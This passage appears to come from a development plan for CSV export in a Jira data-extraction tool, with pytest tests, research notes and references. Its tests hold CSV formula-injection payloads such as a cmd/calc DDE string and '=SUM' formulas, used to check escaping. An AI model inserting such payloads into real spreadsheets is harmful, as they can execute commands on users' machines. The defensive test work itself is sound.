        jira_instance="test.atlassian.net",
        output_directory=str(tmp_path),
        filename_pattern="test.json"
    )

    with pytest.raises(ValueError, match="Invalid file extension"):
        generator._validate_output_path(str(tmp_path / "output.txt"), tmp_path)


def test_csv_injection_comprehensive(tmp_path):
    """Test comprehensive CSV injection prevention."""
    generator = OutputGenerator(
        jira_instance="test.atlassian.net",
        output_directory=str(tmp_path),
        filename_pattern="test.json"
    )

    test_cases = [
        ("=1+1", "'=1+1"),
        ("+cmd|'/c calc'", "'+cmd|'/c calc'"),
        ("-2+3", "'-2+3"),
        ("@SUM(1)", "'@SUM(1)"),
        ("\t=evil", "'\t=evil"),
        ("DDE attack", "'DDE attack"),
        ("POWERSHELL evil", "'POWERSHELL evil"),
        ("Normal text", "Normal text"),
    ]

    for input_val, expected in test_cases:
        result = generator._safe_csv_value(input_val)
        assert result == expected, f"Failed for input: {input_val}"


def test_csv_injection_in_actual_export(tmp_path):
    """Verify CSV injection prevention in actual export."""
    generator = OutputGenerator(
        jira_instance="test.atlassian.net",
        output_directory=str(tmp_path),
        filename_pattern="test.json"
    )

    data = {
        "initiatives": [{
            "key": "INIT-1",
            "summary": "=SUM(A1:A10)",  # Formula injection attempt
            "status": "Proposed",
            "url": "https://test",
            "contributing_teams": []
        }],
        "orphaned_epics": []
    }

    extraction_status = ExtractionStatus(complete=True, issues=[])
    result = generator.generate_csv(data, extraction_status)

    import csv
    with open(result.csv_file, encoding="utf-8-sig") as f:
        reader = csv.DictReader(f)
        rows = list(reader)

        # Should be escaped with leading single quote
        assert rows[0]["initiative_summary"].startswith("'=")
```

## Research Insights

### Best Practices for CSV Export in Python (2024-2026)

**Key Findings:**

1. **UTF-8-SIG is the Gold Standard**
   - Automatically adds BOM for Excel recognition
   - Works in Excel, Google Sheets, Numbers, and text editors
   - Source: [Excel compatible Unicode CSV files](https://tobywf.com/2017/08/unicode-csv-excel/)

2. **CSV Injection is a Real Threat**
   - Formula injection occurs when cells start with `=`, `+`, `-`, `@`, `\t`, `\r`
   - DDE (Dynamic Data Exchange) attacks via patterns like `@SUM`, `cmd`, `powershell`
   - Source: [OWASP CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection)

3. **csv.QUOTE_MINIMAL is Optimal**
   - Balances safety and file size
   - Automatically escapes commas, quotes, newlines
   - Source: [Python CSV Documentation](https://docs.python.org/3/library/csv.html)

4. **Performance Optimization Patterns**
   - DictWriter has O(n²) issue with 100+ columns using `extrasaction='raise'`
   - Use `extrasaction='ignore'` for better performance
   - Stream data for files > 100k rows
   - Source: [Python Bug #18219](https://bugs.python.org/issue18219)

5. **Testing Best Practices**
   - Always test UTF-8 BOM presence by reading raw bytes
   - Use parametrized tests for special character handling
   - Test with realistic data volumes for performance regression
   - Source: [Real Python unittest guide](https://realpython.com/python-unittest/)

### Python Type Hints (Modern 3.9+ Syntax)

**Key Recommendations:**

```python
# ✅ Modern syntax (Python 3.9+)
def generate_csv(
    self,
    data: dict[str, Any],
    extraction_status: ExtractionStatus,
    queries: dict[str, str] | None = None,
    custom_path: Path | None = None,
) -> CSVOutput:
    pass

# ❌ Old syntax (avoid)
from typing import Dict, List, Optional
def generate_csv(
    self,
    data: Dict[str, Any],
    extraction_status: ExtractionStatus,
    queries: Optional[Dict[str, str]] = None,
    custom_path: Optional[Path] = None,
) -> CSVOutput:
    pass
```

### Code Simplicity Principles Applied

**Removed Complexity:**
1. ❌ Separate metadata JSON file (YAGNI - use JSON format if metadata needed)
2. ❌ Separate orphaned epics CSV (simpler to have one file)
3. ❌ Complex column ordering logic (alphabetical is simpler and sufficient)

**Estimated LOC Reduction:** 40-50% (from planned 150 lines to ~90 lines)

## Sources & References

### Internal References

- **Current output implementation**: `src/output.py:40-94` (JSON generation pattern)
- **Data hierarchy builder**: `src/builder.py` (structure to flatten for CSV)
- **Testing patterns**: `tests/test_output.py` (164 lines of output tests)
- **CLI framework**: `jira_extract.py` (Click-based command interface)
- **Coding standards**: `CLAUDE.md` (functional style, Four Rules of Simple Design)

### External References

#### Official Documentation
- [Python CSV Module Documentation](https://docs.python.org/3/library/csv.html)
- [Click Parameter Types](https://github.com/pallets/click/blob/main/docs/parameter-types.md)
- [Python 3.12 What's New](https://docs.python.org/3/whatsnew/3.12.html)

#### Security
- [OWASP CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection)
- [CSV Security: Injection Attacks & Safe Handling](https://www.elysiate.com/blog/csv-security-injection-attacks-safe-handling)
- [CSV Formula Injection Attacks](https://www.cyberchief.ai/2024/09/csv-formula-injection-attacks.html)

#### Best Practices
- [Excel compatible Unicode CSV files from Python](https://tobywf.com/2017/08/unicode-csv-excel/)
- [CSV files can be UTF-8](https://fluffyandflakey.blog/2024/07/31/csv-files-can-be-utf-8/)
- [Flexible CSV Handling in Python](https://dev.to/bowmanjd/flexible-csv-handling-in-python-with-dictreader-and-dictwriter-3hae)

#### Performance
- [Optimize Python CSV processing](https://labex.io/tutorials/python-how-to-optimize-performance-of-python-csv-file-processing-398231)
- [Python Bug #18219: DictWriter slow with many columns](https://bugs.python.org/issue18219)

### Related Work

- Custom fields support added: 2026-03-14 (commit fa70c5d)
- Multi-select field support: 2026-03-14 (commit eeab451)
- Original JSON output implementation: Initial release

---

## Next Steps

After plan approval, proceed to **Step 4: Implementation** using `/ce:work`.
